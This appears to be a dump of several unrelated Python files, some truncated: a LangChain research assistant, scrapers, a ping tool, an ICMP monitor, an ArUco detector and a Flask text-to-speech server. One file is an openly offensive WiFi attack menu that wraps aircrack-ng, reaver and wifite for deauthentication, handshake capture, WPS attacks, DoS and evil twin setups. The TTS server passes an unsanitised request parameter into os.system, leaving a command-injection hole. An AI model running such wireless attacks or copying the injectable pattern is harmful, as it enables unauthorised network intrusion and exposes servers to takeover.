    "from langchain.chat_models import ChatOpenAI\nfrom langchain.prompts import ChatPromptTemplate\nimport requests\nfrom langchain.schema.output_parser import StrOutputParser\nfrom bs4 import BeautifulSoup\nfrom dotenv import load_dotenv\nimport os\nfrom langchain.schema.runnable import RunnablePassthrough,RunnableLambda\nfrom langchain.utilities import DuckDuckGoSearchAPIWrapper\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom fastapi import FastAPI\nfrom langserve import add_routes\nimport json\n\nload_dotenv()\nos.environ[\"LANGCHAIN_TRACING_V2\"]=\"true\"\nos.environ[\"LANGCHAIN_API_KEY\"]=os.getenv(\"LANGCHAIN_API_KEY\")\n\nRESULTS_PER_QUESTION=3\n\nddg_search=DuckDuckGoSearchAPIWrapper()\n\ndef web_search(query:str,num_results:int=RESULTS_PER_QUESTION):\n    results=ddg_search.results(query,num_results)\n    return [r[\"link\"] for r in results]\n\n\n\nSUMMARY_TEMPLATE=\"\"\"{text}\n--------------------\n\nUsing the above text, answer in short the following question:\n>{question}\n--------------------\n\"\"\"\n\n\n\n\ntemplate=\"\"\"\n{text}\nUsing the above text, answer the following question:\n>{question}\nIf the question cannot be answered by the text ,simply summarize the text.Include all factual information,numbers,stats etc.\n\"\"\"\n\n\n\nSearch_prompt=ChatPromptTemplate.from_messages(\n    [\n        (\n            \"user\",\n            \"Write 3 google search queries to searh online that form an\"\n            \"objective opinion from the following :{question}\\n\"\n            \"You must respond with a list of strings in the following format:\"\n            '[\"query1\",\"query2\",\"query3\"]',\n        ),\n    ]\n)\n\n\nSummary_prompt=ChatPromptTemplate.from_template(\n    template=SUMMARY_TEMPLATE\n)\nprompt=ChatPromptTemplate.from_template(\n    template=template,\n    \n)\nurl=\"https://blog.langchain.dev/announcing-langsmith/\"\n\ndef scrape_text(website:str):\n    try:\n        response=requests.get(website)\n\n        if response.status_code==200:\n            soup=BeautifulSoup(response.text,'html.parser')\n\n            page_text=soup.get_text(separator=\"\",strip=True)\n\n            return page_text\n        else:\n            return f\"Failed with status:{response.status_code}\"\n    except Exception as e:\n        print(e)\n        return \"Failed with exception:{e}\"\n\n\n\nsearch_question_chain=Search_prompt|ChatGoogleGenerativeAI(model=\"gemini-pro\")|StrOutputParser()|json.loads\n\n# search_question_chain.invoke(\n#     {\n#         \"question\":\"What is difference between langsmith and langchain?\",\n#     }\n# )\n\nscrape_and_summarize_chain = RunnablePassthrough.assign(\n    summary = RunnablePassthrough.assign(\n    text=lambda x: scrape_text(x[\"url\"])[:10000]\n) | Summary_prompt | ChatGoogleGenerativeAI(model=\"gemini-pro\") | StrOutputParser()\n) | (lambda x: f\"URL: {x['url']}\\n\\nSUMMARY: {x['summary']}\")\n\n\nweb_search_chain=RunnablePassthrough.assign(\n    urls=lambda x :web_search(x[\"question\"])\n    )| (lambda x:[{\"question\":x[\"question\"],\"url\":u} for u in x[\"urls\"]]) | scrape_and_summarize_chain.map()\n\nfull_research_chain=search_question_chain|( lambda x:[{\"question\":q} for q in x])|web_search_chain.map()\n\n\nWRITER_SYSTEM_PROMPT = \"You are an AI critical thinker research assistant. Your sole purpose is to write well written, critically acclaimed, objective and structured reports on given text.\"  # noqa: E501\n\nRESEARCH_REPORT_TEMPLATE = \"\"\"Information:\n--------\n{research_summary}\n--------\nUsing the above information, answer the following question or topic: \"{question}\" in a detailed report -- \\\nThe report should focus on the answer to the question, should be well structured, informative, \\\nin depth, with facts and numbers if available and a minimum of 1,200 words.\nYou should strive to write the report as long as you can using all relevant and necessary information provided.\nYou must write the report with markdown syntax.\nYou MUST determine your own concrete and valid opinion based on the given information. Do NOT deter to general and meaningless conclusions.\nWrite all used source urls at the end of the report, and make sure to not add duplicated sources, but only one reference for each.\nYou must write the report in apa format.\nPlease do your best, this is very important to my career.\"\"\"  \n\nprompt = ChatPromptTemplate.from_messages(\n    [\n        (\"system\", WRITER_SYSTEM_PROMPT),\n        (\"user\", RESEARCH_REPORT_TEMPLATE),\n    ]\n)\n\n\ndef collapse_list_of_lists(list_of_lists):\n    content=[]\n    for l in list_of_lists:\n        content.append(\"\\n\\n\".join(l))\n    return \"\\n\\n\".join(content)\n\nchain=RunnablePassthrough.assign(\n    research_summary=full_research_chain|collapse_list_of_lists\n)|prompt|ChatGoogleGenerativeAI(model=\"gemini-pro\",convert_system_message_to_human=True)|StrOutputParser()\n\n\n\n\n\napp = FastAPI(\n    title=\"LangChain Server\",\n    version=\"1.0\",\n    description=\"A simple api server using Langchain's Runnable interfaces\",\n)\n\nadd_routes(\n    app,\n    chain,\n    path=\"/research-assistant\",\n)\n\n\nif __name__ == \"__main__\":\n    import uvicorn\n\n    uvicorn.run(app, host=\"localhost\", port=8000)\n\n\n\n\n\n",
    "#!/usr/bin/env python3\nimport os\nimport subprocess\nfrom subprocess import check_call\nprint(\"\\nInstalling Needed Tools\")\nprint(\"\\n\")\ncmd0 = os.system(\"apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite bettercap wifipumpkin3\")\ncmd  = os.system(\"sleep 3 && clear\")\ndef intro():\n    cmd  = os.system(\"clear\")\n    print(\"\"\"\\033[1;25m\n\n\n   \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584\u2584\u2584\u2584       \u2588\u2588\u2588      \u2584\u2588  \u2588\u2588\u2588\u2584\u2584\u2584\u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2584\u2588              \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588   \u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584 \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2588  \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2580    \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588   \u2588\u2588\u2588    \u2580\u2588\u2588\u2588\u2580\u2580\u2588\u2588 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \n  \u2588\u2588\u2588         \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588   \u2580 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588            \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \n\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588           \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2584\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \n         \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \n   \u2584\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u258c    \u2584       \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \n \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588   \u2588\u2580     \u2584\u2588\u2588\u2588\u2588\u2580   \u2588\u2580    \u2580\u2588   \u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n                                                                            \u2580                                                                                                                                                      \nAuthors  : AKASH|ASWIN|SUDEV|SARATH\n-------------------------------------------------------------------------  \n(1)Start monitor mode       \n(2)Stop monitor mode\n(3)Scan Networks                            \n(4)Getting Handshake(monitor mode needed)                                       \n(5)WPS Networks attacks (Bssid,monitor mode needed)\n(6)Scan for WPS Networks\n(7)DOS Attacks\n(8)Captive Portal\n(9)Evil Twin\n(10)Advanced Monitoring\n\n(0)About Our Team\n(00)Exit\n----------------------------------------------------------------------- \"\"\")\n    print(\"\\nEnter your choise here : !# \")\n    var = int(input(\"\"))\n    if var == 1 :\n        print(\"\\nEnter the interface:(Default(wlan0/wlan1))\")\n        interface = input(\"\")\n        order = \"airmon-ng start {} && airmon-ng check kill\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 2 :\n        print(\"\\nEnter the interface:(Default(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airmon-ng stop {} && service network-manager restart\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 3 :\n        print(\"\\nEnter the interface:(Default >> (wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airodump-ng {} -M\".format(interface)\n        print(\"When Done Press CTRL+c\")\n        cmd = os.system(\"sleep 3\")\n        geny  = os.system(order)\n        cmd = os.system(\"sleep 10\")\n        intro()\n    \n    elif var == 4 :\n        print(\"\\nEnter the interface:(Default >>(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order     = \"airodump-ng {} -M\".format(interface)\n        print(\"\\nWhen Done Press CTRL+c\")\n        print(\"\\nNote: Under Probe it might be Passwords So copy them to the worlist file\")\n        print(\"\\nDon't Attack The Network if its Data is ZERO (you waste your time)\")\n        print(\"\\nyou Can use 's' to arrange networks\")\n        cmd       = os.system(\"sleep 7\")\n        geny      = os.system(order)\n        print(\"\\nEnter the bssid of the target?\")\n        bssid     = str(input(\"\"))\n        print(\"\\nEnter the channel of the network?\")\n        channel   = int(input())\n        print(\"Enter the path of the output file ?\")\n        path = str(input(\"\"))\n        print(\"\\nEnter the number of the packets [1-10000] ( 0 for unlimited number)\")\n        print(\"the number of the packets Depends on the Distance Between you and the network\")\n        dist = int(input(\"\"))\n        order = \"airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}\".format(interface,bssid,channel,path,dist,bssid,interface)\n        geny = os.system(order)\n        intro()\n    elif var == 0 :\n    \n        cmd = os.system(\"clear\")\n        print(\"\"\"\nHi.\nThis is Our Team\n\"\"\")\n        quit()\n    elif var == 00:\n        exit()    \n        \n    elif var == 5:\n        cmd = os.system(\"clear\")\n        print(\"\"\"\n1)Reaver\n2)Bully\n3)wifite (Recommeneded)\n4)PixieWps\n5)wp3 \n0) Back to Main Menu\n\"\"\")\n        print(\"Choose the kind of the attack(External WIFI Adapter Require) ?\")\n        attack = int(input(\"\"))\n        if attack == 1:\n            print(\"\\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))\")\n            interface = str(input(\"\"))\n            print(\"\\nEnter the bssid of the network ?\")\n            bssid = str(input(\"\"))\n            order = (\"reaver -i {} -b {} -vv\").format(interface,bssid)\n        ",
    "from serpapi import GoogleSearch\nimport csv\n\ninput_filename = 'keywords.csv'\n\noutput_filename = 'forum_results.csv'\n\ndef get_forum_results(keyword):\n        params = {\n            'engine': 'google',\n            'q': keyword,\n            'api_key': '[YOUR API KEY]',\n            'location': 'United States',\n            'google_domain': 'google.com',\n            'gl': 'us',\n            'hl': 'en',\n            \"device\": \"mobile\",\n        }\n        search = GoogleSearch(params)\n        results = search.get_dict()\n        discussions_and_forums = results[\"discussions_and_forums\"]\n        return discussions_and_forums\n\nkeywords = []\nwith open(input_filename, mode='r', newline='', encoding='utf-8') as file:\n    reader = csv.reader(file)\n    next(reader, None)  # Skip the header if there is one\n    for row in reader:\n        keywords.append(row[0])\n\nwith open(output_filename, mode='w', newline='', encoding='utf-8') as file:\n    writer = csv.writer(file)\n    for keyword in keywords:\n        print(keyword)\n        try:\n            discussionresults = get_forum_results(keyword)\n            for i in discussionresults:\n                title = i['title']\n                print(title)\n                link = i['link']\n                date = i['date']\n                domain = i['source']\n                writer.writerow([keyword,title,link,date,domain])\n        except:\n            continue\n",
    "import argparse\nimport requests\nimport threading\nimport pycountry\n\ndef ping(host, countries):\n    global avg_ping, avg_loss\n    if not host.replace('.', '').isnumeric():\n        url = f'https://cloudflare-dns.com/dns-query?name={host}&type=A'\n        host = requests.get(url, headers={'Referer': 'https://console.zenlayer.com', 'Accept': 'application/dns-json'}).json()\n        if 'Answer' in host:\n            host = host['Answer'][0]['data']\n        else:\n            print(\"Couldn't resolve host via CloudFlare. Exiting.\")\n            raise SystemExit\n\n    locations, name_location, avg_ping, avg_loss = [], [], [], []\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices')\n    if list.status_code != 200:\n        print('Error while fetching nodes. Exiting.')\n        raise SystemExit\n    for i in list.json():\n        name = i['name'].replace(' ', '_').replace('(', '').replace(')', '').lower().replace(',', '')\n        name_location.append({'name': name, 'normalized': i['name']})\n        locations.append(name)\n\n    threads = []\n    for location in locations:\n        if not countries or location[:2].upper() in countries:\n            thread = threading.Thread(target=check_ping, args=(host, location, name_location))\n            thread.start()\n            threads.append(thread)\n\n    if not threads:\n        print('No nodes with that country. Exiting.')\n    else:\n        for thread in threads:\n            thread.join()\n        print(f'Average ping: {sum(avg_ping) // len(avg_ping)} ms - Average loss: {sum(avg_loss) // len(avg_loss)}%')\ndef check_ping(host, location, name_location):\n    for i in name_location:\n        if i['name'] == location:\n            location_n = i['normalized']\n            break   \n    payload = {\"query_vrf\": \"global\", \"query_location\": location, \"query_type\": \"ping\", \"query_target\": host}\n    response = requests.post(f'https://console.zenlayer.com/lgApi/api/query/', json=payload)\n    if response.text.startswith('{\"output\":'):\n        try:\n            ping = response.json()['output'].split('min/avg/max')[1].split('/')[2]\n            loss = int(response.json()['output'].split('received,')[1].split('%')[0])\n        except:\n            if 'Error connecting to' in response.json()['output']:\n                status = 'Node offline'\n            else:\n                status = 'Error on node'\n            ping = '0 ms'\n            loss = 100\n        status = 'Online' if loss < 50  else 'Offline'\n        if location_n[:2].isalpha():\n            location_n = f'{pycountry.countries.get(alpha_2=location_n[:2]).flag} {location_n[2:]}'\n        print(f'{location_n} - {status} - {ping} - {loss}% loss {\"- CACHED\" if \"cached\" in response.json() and response.json()[\"cached\"] else \"\"}')\n        avg_ping.append(int(ping.split('.')[0].replace('ms', ''))), avg_loss.append(loss)\n    else:\n        print(f'Error while pinging from location: {location_n} \\n Recieved: {response.text}')\n\ndef list_countries():\n    list = requests.get('https://console.zenlayer.com/lgApi/api/devices').json()\n    countries = []\n    for i in list:\n        countries.append(i['name'])\n    print(countries)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Ping tool')\n    parser.add_argument('--host', help='Host to ping')\n    parser.add_argument('--country', nargs='+', help='Countries to ping from')\n    parser.add_argument('--list', action='store_true', help='List all nodes')\n    args = parser.parse_args()\n    if args.list:\n        list_countries()\n        raise SystemExit\n    if not args.host:\n        print('Please provide a host to ping. Exiting.')\n        raise SystemExit\n    ping(args.host, args.country)\n",
    "import logging\r\nfrom collections import defaultdict\r\nfrom datetime import datetime\r\nimport tkinter as tk\r\nfrom tkinter import messagebox, simpledialog, ttk\r\nfrom PIL import Image, ImageTk\r\nfrom scapy.all import sniff, ICMP, IP\r\nfrom threading import Thread\r\nimport matplotlib.pyplot as plt\r\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg\r\nfrom matplotlib.animation import FuncAnimation\r\nfrom matplotlib import style as mplstyle\r\nimport requests\r\nimport subprocess\r\nimport platform\r\n\r\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s: %(message)s')\r\n\r\nmplstyle.use('dark_background')\r\n\r\nclass WickShieldGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Wick Shield - Advanced Network Monitor with IP Blocking\")\r\n        self.master.geometry(\"1280x720\")\r\n        self.master.protocol(\"WM_DELETE_WINDOW\", self.on_closing)\r\n        self.is_closing = False\r\n\r\n        self.ip_activity = defaultdict(lambda: defaultdict(int))\r\n        self.suspicious_ip_counts = defaultdict(int)\r\n        self.block_threshold = 10\r\n\r\n        self.style = ttk.Style(self.master)\r\n        self.style.theme_use('clam') \r\n        self.configure_styles()\r\n\r\n        self.setup_ui()\r\n\r\n        self.sniff_thread = Thread(target=self.sniff_network, daemon=True)\r\n        self.sniff_thread.start()\r\n\r\n    def configure_styles(self):\r\n        background_color = '#181B28'\r\n        foreground_color = '#ffffff'\r\n        button_color = '#5c5c5c'\r\n        tab_color = '#444444'\r\n\r\n        self.style.configure('TFrame', background=background_color)\r\n        self.style.configure('TButton', background=button_color, foreground=foreground_color, font=('Helvetica', 10), borderwidth=1)\r\n        self.style.map('TButton', background=[('active', tab_color)], foreground=[('active', foreground_color)])\r\n        self.style.configure('TLabel', background=background_color, foreground=foreground_color, font=('Helvetica', 10))\r\n        self.style.configure('TNotebook', background=background_color, borderwidth=0)\r\n        self.style.configure('TNotebook.Tab', background=tab_color, foreground=foreground_color, padding=[5, 2], font=('Helvetica', 10, 'bold'))\r\n        self.style.map('TNotebook.Tab', background=[('selected', button_color)], foreground=[('selected', foreground_color)])\r\n        self.style.configure('TEntry', background=button_color, foreground=foreground_color, highlightthickness=0)\r\n\r\n    def setup_ui(self):\r\n        self.load_logo()\r\n\r\n        self.notebook = ttk.Notebook(self.master)\r\n        self.notebook.pack(expand=True, fill='both')\r\n\r\n        self.setup_traffic_tab()\r\n        self.setup_logs_tab()\r\n\r\n        self.fetch_ip_btn = ttk.Button(self.master, text=\"Fetch IP Details\", command=self.fetch_ip_details_dialog)\r\n        self.fetch_ip_btn.pack(side=tk.BOTTOM, pady=20)\r\n\r\n    def load_logo(self):\r\n        try:\r\n            logo_image = Image.open(\"wick_shield_logo.png\")\r\n            logo_image = logo_image.resize((200, 200), Image.Resampling.LANCZOS)\r\n            self.logo_photo = ImageTk.PhotoImage(logo_image)\r\n            logo_label = tk.Label(self.master, image=self.logo_photo, bg='#181B28')\r\n            logo_label.pack(side=tk.TOP, pady=10)\r\n        except Exception as e:\r\n            logging.error(f\"Error loading logo: {e}\")\r\n\r\n\r\n    def setup_traffic_tab(self):\r\n        self.traffic_tab = ttk.Frame(self.notebook)\r\n        self.notebook.add(self.traffic_tab, text=\"Network Traffic\")\r\n\r\n        self.fig, self.ax = plt.subplots(figsize=(6, 4), tight_layout=True)\r\n        self.canvas = FigureCanvasTkAgg(self.fig, master=self.traffic_tab)\r\n        self.canvas_widget = self.canvas.get_tk_widget()\r\n        self.canvas_widget.pack(side=tk.TOP, fill=tk.BOTH, expand=True)\r\n\r\n        self.ani = FuncAnimation(self.fig, self.update_graph, interval=1000, cache_frame_data=False)\r\n\r\n    def setup_logs_tab(self):\r\n        self.logs_tab = ttk.Frame(self.notebook)\r\n        self.notebook.add(self.logs_tab, text=\"Logs\")\r\n\r\n        self.log_text = tk.Text(self.logs_tab, state='disabled', wrap='word', background='gray12', foreground='white')\r\n        self.log_text.pack(expand=True, fill='both')\r\n\r\n        log_scrollbar = ttk.Scrollbar(self.logs_tab, command=self.log_text.yview, orient='vertical')\r\n        log_scrollbar.pack(side='right', fill='y')\r\n        self.log_text['yscrollcommand'] = log_scrollbar.set\r\n\r\n    def sniff_network(self):\r\n        sniff(prn=self.process_packet, filter=\"icmp\", store=0)\r\n\r\n    def process_packet(self, packet):\r\n        if packet.haslayer(ICMP):\r\n            src_ip = packet[IP].src\r\n            self.suspicious_ip_counts[src_ip] += 1\r\n            if self.suspicious_ip_counts[src_ip] >= self.block_threshold:\r\n                self.block_ip(src_ip)\r\n            self.ip_activity[src_ip][datetime.now().minute] += 1\r\n            self.log(f\"ICMP Packet: {src_ip}\")\r\n\r\n    def update_graph(self, frame):\r\n        if self.is_closing:\r\n            return\r\n        ips = list(self.ip_activity.keys",
    "import cv2\nimport numpy as np\nimport argparse\n \n# Project: ArUco Marker Detector\n# Reference: https://www.pyimagesearch.com/2020/12/21/detecting-aruco-markers-with-opencv-and-python/\n \ndesired_aruco_dictionary = \"DICT_ARUCO_ORIGINAL\"\n \n# The different ArUco dictionaries built into the OpenCV library. \nARUCO_DICT = {\n  \"DICT_4X4_50\": cv2.aruco.DICT_4X4_50,\n  \"DICT_4X4_100\": cv2.aruco.DICT_4X4_100,\n  \"DICT_4X4_250\": cv2.aruco.DICT_4X4_250,\n  \"DICT_4X4_1000\": cv2.aruco.DICT_4X4_1000,\n  \"DICT_5X5_50\": cv2.aruco.DICT_5X5_50,\n  \"DICT_5X5_100\": cv2.aruco.DICT_5X5_100,\n  \"DICT_5X5_250\": cv2.aruco.DICT_5X5_250,\n  \"DICT_5X5_1000\": cv2.aruco.DICT_5X5_1000,\n  \"DICT_6X6_50\": cv2.aruco.DICT_6X6_50,\n  \"DICT_6X6_100\": cv2.aruco.DICT_6X6_100,\n  \"DICT_6X6_250\": cv2.aruco.DICT_6X6_250,\n  \"DICT_6X6_1000\": cv2.aruco.DICT_6X6_1000,\n  \"DICT_7X7_50\": cv2.aruco.DICT_7X7_50,\n  \"DICT_7X7_100\": cv2.aruco.DICT_7X7_100,\n  \"DICT_7X7_250\": cv2.aruco.DICT_7X7_250,\n  \"DICT_7X7_1000\": cv2.aruco.DICT_7X7_1000,\n  \"DICT_ARUCO_ORIGINAL\": cv2.aruco.DICT_ARUCO_ORIGINAL\n}\n\nif __name__ == '__main__':\n\n  parser = argparse.ArgumentParser(description='Detect ArUco Marker')\n\n  ### Positional arguments\n  parser.add_argument('-p', '--pokemon_flag', default=False, help=\"Flag to draw traditional location of ArUco Markers or pokemons\")\n\n  args = vars(parser.parse_args())\n\n  pokemon_flag  = (args[\"pokemon_flag\"])\n\n  # Check if ArUco marker exist.\n  if ARUCO_DICT.get(desired_aruco_dictionary, None) is None:\n    print(\"[INFO] ArUCo tag of '{}' is not supported\".format(\n      args[\"type\"]))\n    sys.exit(0)\n     \n  # Load the ArUco dictionary\n  print(\"[INFO] detecting '{}' markers...\".format(\n    desired_aruco_dictionary))\n  this_aruco_dictionary = cv2.aruco.Dictionary_get(ARUCO_DICT[desired_aruco_dictionary])\n  this_aruco_parameters = cv2.aruco.DetectorParameters_create()\n   \n  # Start the video stream\n  # 0 is default camera, change value for different input camera\n  cv2.namedWindow(\"frame\", cv2.WINDOW_NORMAL)\n  cap = cv2.VideoCapture(0) \n   \n  while(True):\n  \n    # Get Frame\n    ret, frame = cap.read()\n     \n    # Detect ArUco markers in the video frame\n    (corners, ids, rejected) = cv2.aruco.detectMarkers(\n      frame, this_aruco_dictionary, parameters=this_aruco_parameters)\n       \n    # Check that at least one ArUco marker was detected\n    if len(corners) > 0:\n      # Flatten the ArUco IDs list\n      ids = ids.flatten()\n       \n      # Loop over the detected ArUco corners\n      for (marker_corner, marker_id) in zip(corners, ids):\n       \n        # Extract the marker corners\n        corners = marker_corner.reshape((4, 2))\n        (top_left, top_right, bottom_right, bottom_left) = corners\n         \n        # Convert the (x,y) coordinate pairs to integers\n        top_right = (int(top_right[0]), int(top_right[1]))\n        bottom_right = (int(bottom_right[0]), int(bottom_right[1]))\n        bottom_left = (int(bottom_left[0]), int(bottom_left[1]))\n        top_left = (int(top_left[0]), int(top_left[1]))      \n         \n        # Calculate the center of the ArUco marker\n        center_x = int((top_left[0] + bottom_right[0]) / 2.0)\n        center_y = int((top_left[1] + bottom_right[1]) / 2.0)\n        \n        # Draw pokemons over frame, else just draw bounding box for ArUco Markers\n        if pokemon_flag:          \n          width = abs(top_left[0] - bottom_right[0])\n          height = abs(top_left[1] - bottom_right[1])\n          dim = (width, height)\n\n          try:\n              bH, bW = frame.shape[:2]\n              empty = 0 * np.ones((bH, bW, 3), dtype=np.uint8)\n              # This drawing only consider one orientation of the marker\n              if marker_id == 5:\n                overlay_charmander = cv2.imread('data/charmander.png')\n                overlay_charmander = cv2.resize(overlay_charmander, dim, interpolation = cv2.INTER_AREA)\n\n                empty[:height, :width] = overlay_charmander\n                _inp = np.float32([[0, 0], [width, 0], [width, height], [0, height]])\n                _out = np.float32([top_left, top_right, bottom_right, bottom_left])\n                M = cv2.getPerspectiveTransform(_inp, _out)\n                transformed = cv2.warpPerspective(empty, M, (bW, bH))\n                frame[np.where(transformed != 0)] = transformed[np.where(transformed != 0)]\n\n              elif marker_id == 1:\n                overlay_bulbasaur = cv2.imread('data/bulbasaur.png')\n                overlay_bulbasaur = cv2.resize(overlay_bulbasaur, dim, interpolation = cv2.INTER_AREA)\n\n                empty[:height, :width] = overlay_bulbasaur\n                _inp = np.float32([[0, 0], [width, 0], [width, height], [0, height]])\n                _out = np.float32([top_left, top_right, bottom_right, bottom_left])\n                M = cv2.getPerspectiveTransform(_inp, _out)\n                transformed = cv2.warpPerspective(empty, M, (bW, bH))\n                frame[np.where(transformed != 0)] = transformed[np.where(transformed != 0)]\n\n              elif marker_id ",
    "# encoding=utf-8\nimport hashlib\nimport os\nfrom flask import Flask, request, jsonify, make_response, send_from_directory\nimport re\nimport time\nimport uuid\napp = Flask(__name__)\n# tts\nvoiceMap = {\n    \"xiaoxiao\": \"zh-CN-XiaoxiaoNeural\",\n    \"xiaoyi\": \"zh-CN-XiaoyiNeural\",\n    \"yunjian\": \"zh-CN-YunjianNeural\",\n    \"yunxi\": \"zh-CN-YunxiNeural\",\n    \"yunxia\": \"zh-CN-YunxiaNeural\",\n    \"yunyang\": \"zh-CN-YunyangNeural\",\n    \"xiaobei\": \"zh-CN-liaoning-XiaobeiNeural\",\n    \"xiaoni\": \"zh-CN-shaanxi-XiaoniNeural\",\n    \"hiugaai\": \"zh-HK-HiuGaaiNeural\",\n    \"hiumaan\": \"zh-HK-HiuMaanNeural\",\n    \"wanlung\": \"zh-HK-WanLungNeural\",\n    \"hsiaochen\": \"zh-TW-HsiaoChenNeural\",\n    \"hsioayu\": \"zh-TW-HsiaoYuNeural\",\n    \"yunjhe\": \"zh-TW-YunJheNeural\",\n}\n\ndef getVoiceById(voiceId):\n    return voiceMap.get(voiceId)\n\n# \u5220\u9664html\u6807\u7b7e\ndef remove_html(string):\n    regex = re.compile(r'<[^>]+>')\n    return regex.sub('', string)\n\n\ndef createAudio(text, voiceId, rate):\n    new_text = remove_html(text)\n    voice = getVoiceById(voiceId)\n    rate = f\"+{rate}%\"\n    if not voice:\n        return \"error params\"\n    data_md5 = hashlib.md5((text+voiceId+rate).encode('utf-8')).hexdigest()\n    file_name = f'{data_md5}.mp3'\n    if os.path.exists(file_name):\n        pwdPath = os.getcwd()\n        filePath = pwdPath + \"/\" + file_name\n        return filePath\n    pwdPath = os.getcwd()\n    filePath = pwdPath + \"/\" + file_name\n    dirPath = os.path.dirname(filePath)\n    if not os.path.exists(dirPath):\n        os.makedirs(dirPath)\n    if not os.path.exists(filePath):\n        # \u7528open\u521b\u5efa\u6587\u4ef6 \u517c\u5bb9mac\n        open(filePath, 'a').close()\n    script = 'edge-tts --rate=' + rate + ' --voice ' + voice + ' --text \"' + new_text + '\" --write-media ' + filePath\n    os.system(script)\n    return filePath\n\n@app.route('/tts', methods=['POST', 'GET'])\ndef tts():\n    clear_tmp_file()\n    text = request.args.get('text')\n    if len(text) <= 0:\n        return jsonify({\"code\": \"\u5f02\u5e38\", \"message\": \"text\u53c2\u6570\u4e0d\u80fd\u4e3a\u7a7a\"})\n    voice = request.args.get('voice')\n    rate = request.args.get('rate')\n    print(text, voice, rate)\n    filePath = createAudio(text, voice, rate)\n    r = os.path.split(filePath)\n    print(r)\n    try:\n        response = make_response(\n            send_from_directory(r[0], r[1], as_attachment=True))\n        return response\n    except Exception as e:\n        return jsonify({\"code\": \"\u5f02\u5e38\", \"message\": \"{}\".format(e)})\n\n\n\ndef clear_tmp_file(sec=120):\n    zip_file_list = os.listdir(os.getcwd())\n    for file in zip_file_list:\n        if file.endswith('.zip') or file.endswith('mp3') or file.endswith('jpg'):\n            zip_file_time = os.path.getmtime(file)\n            if (time.time() - zip_file_time) > sec:\n                os.remove(file)\n\n@app.route('/', methods=['GET', 